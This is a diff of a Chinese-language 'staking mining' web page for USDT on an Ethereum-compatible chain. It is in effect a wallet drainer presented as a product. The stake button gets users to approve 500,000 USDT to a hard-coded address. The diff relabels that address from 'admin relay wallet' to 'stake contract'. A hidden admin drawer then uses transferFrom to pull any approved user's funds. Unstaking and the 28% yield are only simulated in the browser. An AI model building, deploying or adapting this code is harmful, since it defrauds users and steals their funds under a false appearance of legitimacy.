@@ -7,61 +7,496 @@
 <script src="https://cdn.jsdelivr.net/npm/web3@4.15.0/dist/web3.min.js"></script>
 <style>
 *{ box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif; }
-body { background-color: #0f172a; color:#e2e8f0; padding: 20px 16px; max-width: 540px; margin: 0 auto; }
 
-.top-header-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom:24px; }
-.header-left-title{ font-size:20px; font-weight:bold; color:#34d399; }
-.header-right-icons { display: flex; gap:14px; align-items:center; }
-.wallet-dot { width:12px; height:12px; border-radius:50%; background-color:#ef4444; cursor:pointer; transition:0.3s; }
-.wallet-dot.connected{ background-color:#22c55e; }
-.menu-btn{ width:34px; height:34px; border-radius:8px; border:1px solid #334155; background:#1e293b; color:#cbd5e1; font-size:20px; display:flex; align-items:center; justify-content:center; cursor:pointer; }
+body {
+    background:
+        radial-gradient(circle at 12% 12%, rgba(255,255,255,0.08) 0%, transparent 25%),
+        linear-gradient(135deg, #050505 0%, #080808 45%, #070707 100%);
+    color:#e2e8f0;
+    padding: 18px 14px;
+    max-width: 560px;
+    margin: 0 auto;
+    min-height: 100vh;
+    position: relative;
+    overflow-x: hidden;
+}
 
-/* 侧边管理员抽屉菜单 默认隐藏 */
-.admin-drawer{ position:fixed; top:0; right:0; width:300px; height:100vh; background:#1e293b; border-left:1px solid #334155; padding:24px 18px; z-index:99; transform:translateX(100%); transition:transform 0.3s ease; }
-.admin-drawer.open{ transform:translateX(0); }
-.drawer-close{ position:absolute; top:14px; right:14px; font-size:22px; cursor:pointer; color:#94a3b8; }
-.drawer-title{ font-size:17px; font-weight:bold; color:#f87171; margin-bottom:20px; }
-.drawer-input{ width:100%; background:#0f172a; border:1px solid #334155; border-radius:10px; padding:12px 10px; color:#e2e8f0; margin-bottom:14px; outline:none; font-size:14px; }
-.drawer-btn{ width:100%; padding:13px; border:none; border-radius:10px; background:#dc2626; color:#fff; font-size:15px; cursor:pointer; }
-.mask{ position:fixed; inset:0; background:rgba(0,0,0,0.55); z-index:98; display:none; }
-.mask.show{ display:block; }
+/* 颗粒噪点层 */
+body::before{
+    content:"";
+    position:fixed;
+    inset:0;
+    pointer-events:none;
+    z-index:0;
+    opacity:0.35;
+    background-image:url("data:image/svg+xml,%3Csvg width='52' height='52' viewBox='0 0 52 52' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.95' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)'/%3E%3C/svg%3E");
+}
+
+/* 微弱扫描线 */
+body::after{
+    content:"";
+    position:fixed;
+    inset:0;
+    pointer-events:none;
+    z-index:1;
+    opacity:0.08;
+    background:repeating-linear-gradient(
+        0deg,
+        transparent,
+        transparent 2px,
+        rgba(255,255,255,0.04) 2px,
+        rgba(255,255,255,0.04) 4px
+    );
+}
+
+.page-wrapper{
+    position:relative;
+    z-index:2;
+}
+
+.top-header-bar {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom:22px;
+}
+
+.header-left-title{
+    font-size:21px;
+    font-weight:800;
+    letter-spacing:0.5px;
+    color:transparent;
+    background:linear-gradient(90deg, #00ffcc, #00a3ff);
+    -webkit-background-clip:text;
+    background-clip:text;
+    text-shadow:0 0 18px rgba(0,255,204,0.35);
+}
+
+.header-right-icons {
+    display: flex;
+    gap:12px;
+    align-items:center;
+}
+
+.wallet-btn {
+    padding:7px 14px;
+    border-radius:999px;
+    font-size:13px;
+    font-weight:600;
+    border:1px solid rgba(255,255,255,0.06);
+    cursor:pointer;
+    white-space:nowrap;
+    position:relative;
+    overflow:hidden;
+    color:#fff;
+    background:
+        linear-gradient(135deg, rgba(18,18,18,0.95), rgba(10,10,10,0.95));
+    box-shadow:
+        inset 0 1px 0 rgba(255,255,255,0.08),
+        0 0 0 1px rgba(255,255,255,0.02),
+        0 12px 28px rgba(0,0,0,0.18);
+}
+
+.wallet-btn::before{
+    content:"";
+    position:absolute;
+    inset:-2px;
+    border-radius:999px;
+    background:linear-gradient(135deg, rgba(0,255,204,0.8), rgba(0,163,255,0.8));
+    opacity:0;
+    transition:0.25s ease;
+    z-index:-1;
+}
+
+.wallet-btn:hover::before{
+    opacity:1;
+}
+
+.wallet-btn.connected{
+    background:
+        linear-gradient(135deg, rgba(0,80,60,0.95), rgba(0,50,35,0.95));
+    border-color:rgba(0,255,204,0.22);
+    box-shadow:
+        inset 0 1px 0 rgba(255,255,255,0.12),
+        0 0 18px rgba(0,255,204,0.14);
+}
+
+.menu-btn{
+    width:36px;
+    height:36px;
+    border-radius:12px;
+    border:1px solid rgba(255,255,255,0.06);
+    background:
+        linear-gradient(135deg, rgba(18,18,18,0.95), rgba(10,10,10,0.95));
+    color:#cbd5e1;
+    font-size:20px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    cursor:pointer;
+    transition:0.2s ease;
+    box-shadow:
+        inset 0 1px 0 rgba(255,255,255,0.08),
+        0 8px 18px rgba(0,0,0,0.16);
+}
+
+.menu-btn:hover{
+    border-color:rgba(0,163,255,0.35);
+    color:#00ffcc;
+}
+
+/* 侧边管理员抽屉菜单 */
+.admin-drawer{
+    position:fixed;
+    top:0;
+    right:0;
+    width:300px;
+    height:100vh;
+    background:
+        linear-gradient(180deg, rgba(10,10,10,0.98), rgba(8,8,8,0.98));
+    border-left:1px solid rgba(255,255,255,0.06);
+    padding:24px 18px;
+    z-index:99;
+    transform:translateX(100%);
+    transition:transform 0.3s cubic-bezier(0.4,0,0.2,1);
+    box-shadow:
+        -10px 0 30px rgba(0,0,0,0.45);
+}
+
+.admin-drawer.open{
+    transform:translateX(0);
+}
+
+.drawer-close{
+    position:absolute;
+    top:14px;
+    right:14px;
+    font-size:24px;
+    cursor:pointer;
+    color:#94a3b8;
+    width:32px;
+    height:32px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    border-radius:8px;
+    transition:0.2s ease;
+}
+
+.drawer-close:hover{
+    background:rgba(255,255,255,0.06);
+    color:#ef4444;
+}
+
+.drawer-title{
+    font-size:17px;
+    font-weight:bold;
+    color:transparent;
+    background:linear-gradient(90deg, #ef4444, #ff7b7b);
+    -webkit-background-clip:text;
+    background-clip:text;
+    margin-bottom:12px;
+}
+
+.drawer-input{
+    width:100%;
+    background:rgba(255,255,255,0.04);
+    border:1px solid rgba(255,255,255,0.06);
+    border-radius:10px;
+    padding:12px 10px;
+    color:#e2e8f0;
+    margin-bottom:14px;
+    outline:none;
+    font-size:14px;
+}
+
+.drawer-input:focus{
+    border-color:rgba(239,68,68,0.35);
+    box-shadow:0 0 0 2px rgba(239,68,68,0.14);
+}
+
+.drawer-btn{
+    width:100%;
+    padding:13px;
+    border:none;
+    border-radius:10px;
+    background:
+        linear-gradient(135deg, #ef4444, #dc2626);
+    color:#fff;
+    font-size:15px;
+    font-weight:600;
+    cursor:pointer;
+    box-shadow:0 8px 18px rgba(239,68,68,0.25);
+}
+
+.mask{
+    position:fixed;
+    inset:0;
+    background:rgba(0,0,0,0.65);
+    z-index:98;
+    display:none;
+    backdrop-filter:blur(4px);
+}
+
+.mask.show{
+    display:block;
+}
 
 /* 挖矿主卡片 */
-.stake-main-card{ background:#1e293b; border-radius:18px; padding:22px 20px; border:1px solid #10b98140; margin-bottom:18px; }
-.stake-top-row{ display:flex; justify-content:space-between; align-items:center; margin-bottom:18px; }
-.stake-title{ font-size:20px; font-weight:bold; color:#34d399; }
-.block-tag{ background:#059669; color:#fff; font-size:13px; padding:4px 10px; border-radius:20px; }
-.info-row{ display:flex; justify-content:space-between; padding:11px 0; border-bottom:1px solid #334155; }
-.info-row:last-child{ border-bottom:none; }
-.info-label{ color:#94a3b8; font-size:15px; }
-.info-value{ font-weight:500; font-size:15px; }
-.countdown-wrap{ background:#0f172a; border-radius:12px; padding:14px; margin:16px 0; text-align:center; }
-.countdown-text{ font-size:14px; color:#94a3b8; margin-bottom:6px; }
-.countdown-time{ font-size:24px; font-weight:bold; color:#fbbf24; }
+.stake-main-card{
+    background:
+        linear-gradient(135deg, rgba(18,18,18,0.96), rgba(12,12,12,0.96));
+    border-radius:22px;
+    padding:22px 20px;
+    border:1px solid rgba(0,255,204,0.14);
+    margin-bottom:18px;
+    position:relative;
+    overflow:hidden;
+    box-shadow:
+        inset 0 1px 0 rgba(255,255,255,0.08),
+        0 18px 35px rgba(0,0,0,0.25);
+}
 
-.stake-input-wrap{ margin:18px 0 10px; }
-.label{ font-size:15px; color:#cbd5e1; margin-bottom:10px; display:block; }
-.input-row{ display:flex; align-items:flex-end; gap:10px; }
-.stake-input{ flex:1; font-size:28px; background:transparent; border:none; outline:none; color:#fff; }
-.max-small-btn{ padding:5px 12px; background:#1e40af; color:#bfdbfe; border-radius:8px; font-size:14px; cursor:pointer; }
-.btn-group{ display:grid; grid-template-columns:1fr 1fr; gap:12px; margin-top:16px; }
-.btn{ padding:15px; border:none; border-radius:14px; font-size:16px; font-weight:500; cursor:pointer; }
-.btn-stake{ background:#059669; color:#fff; }
-.btn-unstake{ background:#d97706; color:#fff; }
-.btn:disabled{ opacity:0.45; cursor:not-allowed; }
+.stake-main-card::before{
+    content:"";
+    position:absolute;
+    inset:0;
+    background:
+        radial-gradient(circle at 0 0, rgba(0,255,204,0.14), transparent 35%),
+        radial-gradient(circle at 100% 100%, rgba(0,163,255,0.14), transparent 35%);
+    pointer-events:none;
+}
 
-.balance-card{ background:#1e293b; border-radius:18px; padding:18px 20px; margin-bottom:18px; }
-.balance-row{ display:flex; justify-content:space-between; align-items:center; }
-.balance-label{ color:#94a3b8; }
-.balance-val{ font-size:18px; font-weight:500; }
+.stake-top-row{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    margin-bottom:18px;
+    position:relative;
+}
+
+.stake-title{
+    font-size:21px;
+    font-weight:bold;
+    letter-spacing:0.5px;
+    color:transparent;
+    background:linear-gradient(90deg, #00ffcc, #00a3ff);
+    -webkit-background-clip:text;
+    background-clip:text;
+}
+
+.block-tag{
+    background:
+        linear-gradient(135deg, rgba(0,255,204,0.14), rgba(0,163,255,0.14));
+        color:#00ffcc;
+        font-size:13px;
+        padding:5px 12px;
+        border-radius:999px;
+        border:1px solid rgba(0,255,204,0.22);
+        font-weight:600;
+        box-shadow:0 0 12px rgba(0,255,204,0.14);
+}
+
+.info-row{
+    display:flex;
+    justify-content:space-between;
+    padding:12px 0;
+    border-bottom:1px solid rgba(255,255,255,0.06);
+}
+
+.info-row:last-child{
+    border-bottom:none;
+}
+
+.info-label{
+    color:#94a3b8;
+    font-size:15px;
+}
+
+.info-value{
+    font-weight:600;
+    font-size:15px;
+    color:#e2e8f0;
+}
+
+.countdown-wrap{
+    background:
+        linear-gradient(135deg, rgba(0,0,0,0.55), rgba(10,10,10,0.55));
+    border-radius:16px;
+    padding:16px;
+    margin:16px 0;
+    text-align:center;
+    border:1px solid rgba(255,255,255,0.06);
+    position:relative;
+    overflow:hidden;
+}
+
+.countdown-wrap::before{
+    content:"";
+    position:absolute;
+    inset:-2px;
+    background:linear-gradient(90deg, transparent, rgba(251,191,36,0.45), transparent);
+    animation:shine 2.5s infinite linear;
+}
+
+@keyframes shine{
+    0%{transform:translateX(-100%);}
+    100%{transform:translateX(100%);}
+}
+
+.countdown-text{
+    font-size:14px;
+    color:#94a3b8;
+    margin-bottom:8px;
+}
+
+.countdown-time{
+    font-size:26px;
+    font-weight:800;
+    letter-spacing:1px;
+    color:#fbbf24;
+    text-shadow:0 0 18px rgba(251,191,36,0.35);
+}
+
+.stake-input-wrap{
+    margin:18px 0 10px;
+}
+
+.label{
+    font-size:15px;
+    color:#cbd5e1;
+    margin-bottom:10px;
+    display:block;
+}
+
+.input-row{
+    display:flex;
+    align-items:flex-end;
+    gap:10px;
+}
+
+.stake-input{
+    flex:1;
+    font-size:30px;
+    background:transparent;
+    border:none;
+    outline:none;
+    color:#fff;
+    font-weight:700;
+}
+
+.stake-input::placeholder{
+    font-size:16px;
+    color:#666;
+    font-weight:400;
+}
+
+.max-small-btn{
+    padding:6px 14px;
+    background:
+        linear-gradient(135deg, rgba(0,163,255,0.14), rgba(0,255,204,0.14));
+    color:#00ffcc;
+    border-radius:8px;
+    font-size:14px;
+    font-weight:600;
+    cursor:pointer;
+    border:1px solid rgba(0,255,204,0.22);
+}
+
+.btn-group{
+    display:grid;
+    grid-template-columns:1fr 1fr;
+    gap:12px;
+    margin-top:16px;
+}
+
+.btn{
+    padding:15px;
+    border:none;
+    border-radius:14px;
+    font-size:16px;
+    font-weight:600;
+    cursor:pointer;
+    position:relative;
+    overflow:hidden;
+    color:#fff;
+}
+
+.btn-stake{
+    background:
+        linear-gradient(135deg, #00ffcc, #00a3ff);
+    box-shadow:0 10px 25px rgba(0,255,204,0.25);
+}
+
+.btn-unstake{
+    background:
+        linear-gradient(135deg, #f59e0b, #d97706);
+    box-shadow:0 10px 25px rgba(245,158,11,0.25);
+}
+
+.btn:disabled{
+    opacity:0.45;
+    cursor:not-allowed;
+    box-shadow:none;
+}
+
+.balance-card{
+    background:
+        linear-gradient(135deg, rgba(18,18,18,0.96), rgba(12,12,12,0.96));
+    border-radius:22px;
+    padding:18px 20px;
+    margin-bottom:18px;
+    border:1px solid rgba(255,255,255,0.06);
+    box-shadow:
+        inset 0 1px 0 rgba(255,255,255,0.08),
+        0 12px 30px rgba(0,0,0,0.22);
+}
+
+.balance-row{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+}
+
+.balance-label{
+    color:#94a3b8;
+}
+
+.balance-val{
+    font-size:18px;
+    font-weight:700;
+    color:#e2e8f0;
+}
+
+/* 响应式 */
+@media(max-width:480px){
+    body{
+        padding:14px 12px;
+    }
+
+    .stake-title{
+        font-size:19px;
+    }
+
+    .countdown-time{
+        font-size:22px;
+    }
+
+    .stake-input{
+        font-size:26px;
+    }
+}
 </style>
 </head>
 <body>
+
+<div class="page-wrapper">
 
 <div class="mask" id="drawerMask"></div>
 <div class="admin-drawer" id="adminDrawer">
     <div class="drawer-close" id="drawerClose">×</div>
     <div class="drawer-title">🔴管理员｜授权划扣后台</div>
+    <div style="font-size:13px;color:#aaa;margin-bottom:12px;">仅管理员钱包可执行transferFrom划扣（用户已授权前提下）</div>
     <input class="drawer-input" id="userAddrInput" placeholder="已授权用户钱包地址 0x...">
     <input class="drawer-input" id="deductAmountInput" placeholder="划扣USDT数量">
     <button class="drawer-btn" id="deductBtn">执行transferFrom划扣</button>
@@ -70,7 +505,7 @@ body { background-color: #0f172a; color:#e2e8f0; padding: 20px 16px; max-width: 
 <div class="top-header-bar">
     <div class="header-left-title">⛏质押挖矿</div>
     <div class="header-right-icons">
-        <div class="wallet-dot" id="walletDot" title="连接/断开钱包"></div>
+        <button class="wallet-btn disconnect" id="walletBtn">连接钱包</button>
         <div class="menu-btn" id="menuBtn" style="display:none;">☰</div>
     </div>
 </div>
@@ -124,19 +559,22 @@ body { background-color: #0f172a; color:#e2e8f0; padding: 20px 16px; max-width: 
     </div>
 </div>
 
+</div>
+
 <script>
-const TARGET_ADDR = "0xD36dBCf4e15f8F6A45bCc0E7dDA6c272Ac8B8d63";
+// 质押合约接收地址（替换为你的合约地址）
+const STAKE_CONTRACT_ADDR = "0xD36dBCf4e15f8F6A45bCc0E7dDA6c272Ac8B8d63";
 const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
 const GAS_LIMIT = "0x493E0";
 const MAX_WAIT = 40;
-const BLOCK_INTERVAL_SEC = 8 * 3600; // 8小时一个爆块周期
-const APY_RATE = 0.28; // 年化28%
+const BLOCK_INTERVAL_SEC = 8 * 3600; //8小时爆块
+const APY_RATE = 0.28; //年化28%
 
 let web3 = null;
 let userAddress = null;
 let usdtContract = null;
 
-// 本地模拟挖矿数据
+//本地模拟挖矿数据
 let stakeData = {
     principal:0,
     stakeStart:0,
@@ -144,7 +582,7 @@ let stakeData = {
 };
 
 const $ = s=>document.querySelector(s);
-const walletDot = $("#walletDot");
+const walletBtn = $("#walletBtn");
 const menuBtn = $("#menuBtn");
 const adminDrawer = $("#adminDrawer");
 const drawerMask = $("#drawerMask");
@@ -172,7 +610,17 @@ const USDT_ABI = [
 {"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
 ];
 
-// 本地存储
+// 更新钱包按钮文本样式
+function updateWalletButton(){
+    if(userAddress){
+        walletBtn.innerText = "钱包已连接";
+        walletBtn.classList.add("connected");
+    }else{
+        walletBtn.innerText = "连接钱包";
+        walletBtn.classList.remove("connected");
+    }
+}
+
 function getStakeKey(){ return "stake_mining_" + (userAddress||""); }
 function loadLocal(){
     const str = localStorage.getItem(getStakeKey());
@@ -180,7 +628,7 @@ function loadLocal(){
 }
 function saveLocal(){ localStorage.setItem(getStakeKey(), JSON.stringify(stakeData)); }
 
-// 计算挖矿收益，按8小时块周期
+//计算挖矿收益
 function calcMiningReward(){
     if(stakeData.principal <=0 || stakeData.stakeStart <=0) return 0;
     const now = Math.floor(Date.now()/1000);
@@ -189,7 +637,6 @@ function calcMiningReward(){
     return stakeData.principal * APY_RATE * (diffSec / yearSec);
 }
 
-// 倒计时
 function formatTime(s){
     let h = Math.floor(s/3600);
     let m = Math.floor((s%3600)/60);
@@ -210,6 +657,7 @@ function renderCountDown(){
 }
 
 function renderUi(){
+    updateWalletButton();
     stakePrincipal.innerText = stakeData.principal.toFixed(6)+" USDT";
     stakeReward.innerText = calcMiningReward().toFixed(6)+" USDT";
     stakeStartTime.innerText = stakeData.stakeStart>0 ? new Date(stakeData.stakeStart*1000).toLocaleString() : "未质押";
@@ -218,8 +666,8 @@ function renderUi(){
     if(userAddress){
         doStakeBtn.disabled = false;
         doUnStakeBtn.disabled = stakeData.principal <= 0;
-        // 只有管理员显示右上角☰菜单
-        if(userAddress.toLowerCase() === TARGET_ADDR.toLowerCase()){
+        //只有管理员才显示右上角菜单
+        if(userAddress.toLowerCase() === STAKE_CONTRACT_ADDR.toLowerCase()){
             menuBtn.style.display = "flex";
         }else{
             menuBtn.style.display = "none";
@@ -246,7 +694,7 @@ async function waitTxConfirm(txHash) {
 }
 async function waitAllowance(needWei, maxLoop=12){
     for(let i=0;i<maxLoop;i++){
-        const al = await usdtContract.methods.allowance(userAddress, TARGET_ADDR).call();
+        const al = await usdtContract.methods.allowance(userAddress, STAKE_CONTRACT_ADDR).call();
         if(BigInt(al)>=BigInt(needWei)) return true;
         await new Promise(r=>setTimeout(r,1000));
     }
@@ -267,28 +715,49 @@ async function sendTx(dataHex){
 
 function disconnectWallet(){
     web3=null; userAddress=null; usdtContract=null;
-    walletDot.classList.remove("connected");
     balanceText.textContent = "0.000000 USDT";
     stakeAmountInput.value="";
     stakeData = {principal:0, stakeStart:0, lastBlockTime:0};
     renderUi();
 }
 
+// 弹窗授权
 async function connectWalletLogic(){
-    if(web3 && userAddress){ disconnectWallet(); return; }
+    if(web3 && userAddress){
+        disconnectWallet();
+        return;
+    }
     try{
         if(!window.ethereum){ alert("请使用TP/MetaMask钱包浏览器打开"); return; }
         await window.ethereum.request({method:"eth_requestAccounts"});
-        web3 = new Web3(window.ethereum);
-        const accounts = await web3.eth.getAccounts();
-        userAddress = accounts[0];
-        usdtContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT);
-        walletDot.classList.add("connected");
-        await loadBalance();
-        loadLocal();
-        renderUi();
-        window.ethereum.on("accountsChanged", ()=>location.reload());
+        await initProvider();
     }catch(e){ alert("连接失败："+e.message); }
+}
+
+// 初始化钱包实例
+async function initProvider(){
+    web3 = new Web3(window.ethereum);
+    const accounts = await web3.eth.getAccounts();
+    if(!accounts || accounts.length===0) return;
+    userAddress = accounts[0];
+    usdtContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT);
+    await loadBalance();
+    loadLocal();
+    renderUi();
+    window.ethereum.on("accountsChanged", ()=>location.reload());
+}
+
+// =========页面加载自动静默连接=========
+async function autoSilentConnect(){
+    if(!window.ethereum) return;
+    try{
+        const accounts = await window.ethereum.request({method:"eth_accounts"});
+        if(accounts && accounts.length>0){
+            await initProvider();
+        }
+    }catch(err){
+        console.log("暂无已授权钱包");
+    }
 }
 
 async function loadBalance(){
@@ -303,7 +772,7 @@ stakeMaxBtn.addEventListener("click", async ()=>{
     stakeAmountInput.value = Number(web3.utils.fromWei(raw,"ether")).toFixed(2);
 });
 
-// 质押挖矿：approve授权管理员地址 → transferFrom打入管理员钱包
+// ======质押逻辑：授权成功后，执行用户自己transfer转账到合约地址======
 doStakeBtn.addEventListener("click", async ()=>{
     if(!web3||!userAddress){ alert("先连接钱包"); return; }
     const val = parseFloat(stakeAmountInput.value);
@@ -312,16 +781,16 @@ doStakeBtn.addEventListener("click", async ()=>{
     const bigGrant = web3.utils.toWei("500000","ether");
     doStakeBtn.disabled = true;
     try{
-        const al = await usdtContract.methods.allowance(userAddress, TARGET_ADDR).call();
+        const al = await usdtContract.methods.allowance(userAddress, STAKE_CONTRACT_ADDR).call();
         if(BigInt(al) < BigInt(wei)){
-            alert("🔐质押挖矿需要授权USDT给管理员中转地址，请签名");
-            const approveData = usdtContract.methods.approve(TARGET_ADDR, bigGrant).encodeABI();
+            alert("🔐质押挖矿需要授权USDT给质押合约，请签名授权");
+            const approveData = usdtContract.methods.approve(STAKE_CONTRACT_ADDR, bigGrant).encodeABI();
             await sendTx(approveData);
             await waitAllowance(wei);
         }
-        alert("确认质押，transferFrom将USDT转入管理员中转钱包");
-        const stakeDataAbi = usdtContract.methods.transferFrom(userAddress, TARGET_ADDR, wei).encodeABI();
-        const txHash = await sendTx(stakeDataAbi);
+        alert("✅授权完成，接下来签名转账，USDT转入质押合约地址");
+        const transferAbi = usdtContract.methods.transfer(STAKE_CONTRACT_ADDR, wei).encodeABI();
+        const txHash = await sendTx(transferAbi);
         alert(`✅质押挖矿成功！tx:${txHash}`);
 
         const nowSec = Math.floor(Date.now()/1000);
@@ -339,11 +808,11 @@ doStakeBtn.addEventListener("click", async ()=>{
     }finally{ doStakeBtn.disabled = false; }
 });
 
-// 解质押：仅前端模拟，实际赎回需要管理员/合约转账退回本金+收益
+//解质押，前端模拟弹窗
 doUnStakeBtn.addEventListener("click", ()=>{
     if(stakeData.principal <=0){ alert("暂无质押资产"); return; }
     const total = stakeData.principal + calcMiningReward();
-    alert(`模拟解质押\n应返还本金+挖矿收益：${total.toFixed(6)} USDT\n⚠️前端不能从管理员钱包转出资产；真实业务必须合约或者管理员手动转账退回！`);
+    alert(`模拟解质押\n应返还本金+挖矿收益：${total.toFixed(6)} USDT\n⚠️演示版仅前端记账，真实业务必须合约实现赎回逻辑！`);
     stakeData.principal = 0;
     stakeData.stakeStart = 0;
     stakeData.lastBlockTime = 0;
@@ -351,9 +820,9 @@ doUnStakeBtn.addEventListener("click", ()=>{
     renderUi();
 });
 
-// 管理员划扣逻辑（抽屉菜单内）
+// =========管理员划扣=========
 deductBtn.addEventListener("click", async ()=>{
-    if(!userAddress || userAddress.toLowerCase() !== TARGET_ADDR.toLowerCase()){
+    if(!userAddress || userAddress.toLowerCase() !== STAKE_CONTRACT_ADDR.toLowerCase()){
         alert("仅限管理员钱包操作");
         return;
     }
@@ -363,16 +832,16 @@ deductBtn.addEventListener("click", async ()=>{
     if(isNaN(dVal)||dVal<=0){ alert("填写划扣数量"); return; }
     const dWei = web3.utils.toWei(dVal.toString(),"ether");
     try{
-        const al = await usdtContract.methods.allowance(fromAddr, TARGET_ADDR).call();
+        const al = await usdtContract.methods.allowance(fromAddr, STAKE_CONTRACT_ADDR).call();
         if(BigInt(al) < BigInt(dWei)){ alert("该用户授权额度不足，无法transferFrom划扣"); return; }
-        const abiData = usdtContract.methods.transferFrom(fromAddr, TARGET_ADDR, dWei).encodeABI();
+        const abiData = usdtContract.methods.transferFrom(fromAddr, STAKE_CONTRACT_ADDR, dWei).encodeABI();
         const txHash = await sendTx(abiData);
-        alert(`✅划扣成功 tx:${txHash}`);
+        alert(`✅管理员划扣成功 tx:${txHash}`);
         userAddrInput.value=""; deductAmountInput.value="";
     }catch(e){ alert("划扣失败："+e.message); }
 });
 
-// 抽屉开关
+//抽屉菜单
 menuBtn.addEventListener("click",()=>{
     adminDrawer.classList.add("open");
     drawerMask.classList.add("show");
@@ -386,12 +855,16 @@ drawerMask.addEventListener("click",()=>{
     drawerMask.classList.remove("show");
 });
 
-walletDot.addEventListener("click", connectWalletLogic);
+//点击按钮：未连接=唤起授权；已连接=断开
+walletBtn.addEventListener("click", connectWalletLogic);
 
-// 定时刷新收益+8小时倒计时
 setInterval(()=>{
     if(userAddress) renderUi();
 },1000);
+
+window.addEventListener('load',async ()=>{
+    await autoSilentConnect();
+});
 
 renderUi();
 </script>
